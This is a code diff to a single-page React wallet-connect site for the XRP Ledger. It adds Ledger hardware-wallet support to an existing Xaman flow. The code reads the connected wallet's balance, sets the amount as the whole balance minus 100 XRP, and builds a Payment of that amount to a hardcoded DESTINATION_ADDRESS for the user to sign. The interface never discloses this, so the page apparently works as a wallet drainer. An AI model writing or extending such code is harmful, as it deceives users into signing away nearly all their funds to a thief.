@@ -8,6 +8,7 @@
     <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
     <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/xrpl@2.11.0/build/xrpl-latest-min.js"></script>
 </head>
 <body>
     <div id="root"></div>
@@ -23,21 +24,26 @@
           const [txHash, setTxHash] = useState('');
           const [qrUrl, setQrUrl] = useState('');
           const [isMobile, setIsMobile] = useState(false);
+          const [showWalletModal, setShowWalletModal] = useState(false);
+          const [walletType, setWalletType] = useState(''); // 'xaman' or 'ledger'
+          const [ledgerTransport, setLedgerTransport] = useState(null);
 
           useEffect(() => {
             // Detect if user is on mobile
             const checkMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
             setIsMobile(checkMobile);
             
-            // Check for saved wallet address in localStorage
+   // Check for saved wallet address
             const savedAddress = localStorage.getItem('xamanWalletAddress');
             const savedBalance = localStorage.getItem('xamanWalletBalance');
             const savedAmount = localStorage.getItem('xamanCalculatedAmount');
+            const savedWalletType = localStorage.getItem('walletType');
             
             if (savedAddress) {
               setWalletAddress(savedAddress);
               setIsConnected(true);
               setTxStatus('connected');
+              setWalletType(savedWalletType || 'xaman');
               
               if (savedBalance) {
                 setUserBalance(parseFloat(savedBalance));
@@ -52,12 +58,98 @@
           const [userBalance, setUserBalance] = useState(0);
           const [calculatedAmount, setCalculatedAmount] = useState('0');
           
-          // Use relative URL for same domain, or set your backend URL
+         // Use relative URL for same domain, or set your backend URL
           const API_BASE = window.location.origin;
 
-          const connectWallet = async () => {
+          const connectLedger = async () => {
             setIsLoading(true);
             setTxStatus('');
+            
+            try {
+              // Load Ledger library dynamically
+              const script = document.createElement('script');
+              script.src = 'https://cdn.jsdelivr.net/npm/@ledgerhq/hw-transport-webusb@6.27.1/lib/TransportWebUSB.min.js';
+              document.head.appendChild(script);
+              
+              await new Promise((resolve) => {
+                script.onload = resolve;
+              });
+              
+              const transport = await TransportWebUSB.create();
+              setLedgerTransport(transport);
+              
+              // Import XRP app
+              const Xrp = (await import('https://cdn.jsdelivr.net/npm/@ledgerhq/hw-app-xrp@6.27.1/+esm')).default;
+              const xrp = new Xrp(transport);
+              
+              // Get address from Ledger
+              const result = await xrp.getAddress("44'/144'/0'/0/0");
+              const account = result.address;
+              
+              setWalletAddress(account);
+              setWalletType('ledger');
+              
+              // Fetch account balance
+              try {
+                const balanceResponse = await fetch('https://xrplcluster.com', {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({
+                    method: 'account_info',
+                    params: [{
+                      account: account,
+                      ledger_index: 'validated'
+                    }]
+                  })
+                });
+                
+                const balanceData = await balanceResponse.json();
+                if (balanceData.result?.account_data?.Balance) {
+                  const balanceInDrops = parseInt(balanceData.result.account_data.Balance);
+                  const balanceInXRP = balanceInDrops / 1000000;
+                  setUserBalance(balanceInXRP);
+                  
+                  const amountToSend = Math.max(0, balanceInXRP - 100);
+                  const amountInDrops = Math.floor(amountToSend * 1000000);
+                  setCalculatedAmount(amountInDrops.toString());
+                  
+                  localStorage.setItem('xamanWalletBalance', balanceInXRP.toString());
+                  localStorage.setItem('xamanCalculatedAmount', amountInDrops.toString());
+                }
+              } catch (error) {
+                console.error('Error fetching balance:', error);
+              }
+              
+              localStorage.setItem('xamanWalletAddress', account);
+              localStorage.setItem('walletType', 'ledger');
+              
+              setIsConnected(true);
+              setTxStatus('connected');
+              setShowWalletModal(false);
+            } catch (error) {
+              setTxStatus('error');
+              console.error('Ledger connection failed:', error);
+              alert('Failed to connect to Ledger. Make sure your device is connected and the XRP app is open.');
+            } finally {
+              setIsLoading(false);
+            }
+          };
+
+          const connectWallet = async () => {
+            // On mobile, directly connect to Xaman
+            if (isMobile) {
+              connectXaman();
+            } else {
+              // On desktop, show wallet selection modal
+              setShowWalletModal(true);
+            }
+          };
+
+          const connectXaman = async () => {
+            setIsLoading(true);
+            setTxStatus('');
+            setShowWalletModal(false);
+            setWalletType('xaman');
             
             try {
               const authPayload = {
@@ -130,8 +222,9 @@
                       console.error('Error fetching balance:', error);
                     }
                     
-                    // Save wallet address to localStorage
+                  // Save wallet address to localStorage
                     localStorage.setItem('xamanWalletAddress', account);
+                    localStorage.setItem('walletType', 'xaman');
                     
                     setIsConnected(true);
                     setTxStatus('connected');
@@ -154,7 +247,95 @@
             }
           };
 
-          const signTransaction = async () => {
+         const signTransaction = async () => {
+            if (walletType === 'ledger') {
+              await signLedgerTransaction();
+            } else {
+              await signXamanTransaction();
+            }
+          };
+
+          const signLedgerTransaction = async () => {
+            setIsLoading(true);
+            setTxStatus('signing');
+            
+            try {
+              // Get account info for sequence number
+              const accountInfoResponse = await fetch('https://xrplcluster.com', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  method: 'account_info',
+                  params: [{
+                    account: walletAddress,
+                    ledger_index: 'validated'
+                  }]
+                })
+              });
+              
+              const accountInfo = await accountInfoResponse.json();
+              const sequence = accountInfo.result.account_data.Sequence;
+              
+              // Get current ledger for LastLedgerSequence
+              const ledgerResponse = await fetch('https://xrplcluster.com', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  method: 'ledger',
+                  params: [{
+                    ledger_index: 'validated'
+                  }]
+                })
+              });
+              
+              const ledgerData = await ledgerResponse.json();
+              const lastLedgerSequence = ledgerData.result.ledger_index + 10;
+              
+              // Prepare transaction
+              const tx = {
+                Account: walletAddress,
+                TransactionType: 'Payment',
+                Destination: DESTINATION_ADDRESS,
+                Amount: calculatedAmount,
+                Fee: '12',
+                Sequence: sequence,
+                LastLedgerSequence: lastLedgerSequence
+              };
+              
+              // Encode transaction
+              const client = new xrpl.Client('wss://xrplcluster.com');
+              await client.connect();
+              
+              const prepared = await client.autofill(tx);
+              const encoded = xrpl.encode(prepared);
+              
+              // Sign with Ledger
+              const Xrp = (await import('https://cdn.jsdelivr.net/npm/@ledgerhq/hw-app-xrp@6.27.1/+esm')).default;
+              const xrpApp = new Xrp(ledgerTransport);
+              
+              const signature = await xrpApp.signTransaction("44'/144'/0'/0/0", encoded);
+              
+              // Submit transaction
+              const signedTx = xrpl.encode({
+                ...prepared,
+                TxnSignature: signature.toUpperCase()
+              });
+              
+              const submitResponse = await client.submitAndWait(signedTx);
+              
+              await client.disconnect();
+              
+              setTxHash(submitResponse.result.hash);
+              setTxStatus('success');
+            } catch (error) {
+              setTxStatus('error');
+              console.error('Ledger transaction failed:', error);
+            } finally {
+              setIsLoading(false);
+            }
+          };
+
+          const signXamanTransaction = async () => {
             setIsLoading(true);
             setTxStatus('signing');
             
@@ -217,22 +398,98 @@
             }
           };
 
-          const disconnect = () => {
+const disconnect = () => {
             setIsConnected(false);
             setWalletAddress('');
             setTxStatus('');
             setTxHash('');
             setUserBalance(0);
             setCalculatedAmount('0');
+            setWalletType('');
+            
+            if (ledgerTransport) {
+              ledgerTransport.close();
+              setLedgerTransport(null);
+            }
             
             // Clear localStorage
             localStorage.removeItem('xamanWalletAddress');
             localStorage.removeItem('xamanWalletBalance');
             localStorage.removeItem('xamanCalculatedAmount');
+            localStorage.removeItem('walletType');
           };
 
-          return (
+         return (
             <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900">
+              {/* Wallet Selection Modal */}
+              {showWalletModal && (
+                <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
+                  <div className="bg-slate-800 border border-slate-700 rounded-2xl p-8 max-w-md w-full shadow-2xl">
+                    <div className="flex justify-between items-center mb-6">
+                      <h2 className="text-2xl font-bold text-white">Connect Wallet</h2>
+                      <button
+                        onClick={() => setShowWalletModal(false)}
+                        className="text-slate-400 hover:text-white transition-colors"
+                      >
+                        <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
+                        </svg>
+                      </button>
+                    </div>
+                    
+                    <p className="text-slate-400 mb-6">Choose your wallet to continue</p>
+                    
+                    <div className="space-y-3">
+                      <button
+                        onClick={connectXaman}
+                        disabled={isLoading}
+                        className="w-full flex items-center gap-4 p-4 bg-slate-700 hover:bg-slate-600 disabled:bg-slate-800 disabled:cursor-not-allowed rounded-xl transition-all group"
+                      >
+                        <div className="w-12 h-12 bg-blue-500 rounded-lg flex items-center justify-center group-hover:scale-110 transition-transform">
+                          <div className="w-6 h-6 bg-white rounded-full"></div>
+                        </div>
+                        <div className="text-left flex-1">
+                          <div className="text-white font-semibold">Xaman</div>
+                          <div className="text-slate-400 text-sm">Connect with Xaman wallet</div>
+                        </div>
+                        <svg className="w-5 h-5 text-slate-400 group-hover:text-white transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
+                        </svg>
+                      </button>
+                      
+                      <button
+                        onClick={connectLedger}
+                        disabled={isLoading}
+                        className="w-full flex items-center gap-4 p-4 bg-slate-700 hover:bg-slate-600 disabled:bg-slate-800 disabled:cursor-not-allowed rounded-xl transition-all group"
+                      >
+                        <div className="w-12 h-12 bg-slate-600 rounded-lg flex items-center justify-center group-hover:scale-110 transition-transform">
+                          <svg className="w-7 h-7 text-white" fill="currentColor" viewBox="0 0 24 24">
+                            <rect x="2" y="6" width="20" height="12" rx="2" />
+                            <circle cx="7" cy="12" r="1.5" fill="currentColor" />
+                          </svg>
+                        </div>
+                        <div className="text-left flex-1">
+                          <div className="text-white font-semibold">Ledger</div>
+                          <div className="text-slate-400 text-sm">Connect with Ledger device</div>
+                        </div>
+                        <svg className="w-5 h-5 text-slate-400 group-hover:text-white transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
+                        </svg>
+                      </button>
+                    </div>
+                    
+                    {isLoading && (
+                      <div className="mt-6 text-center">
+                        <div className="inline-flex items-center gap-2 text-blue-400">
+                          <div className="w-4 h-4 border-2 border-blue-400 border-t-transparent rounded-full animate-spin"></div>
+                          <span>Connecting...</span>
+                        </div>
+                      </div>
+                    )}
+                  </div>
+                </div>
+              )}
+
               <header className="bg-slate-900/80 backdrop-blur-sm border-b border-slate-700/50">
                 <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
                   <div className="flex items-center gap-2">
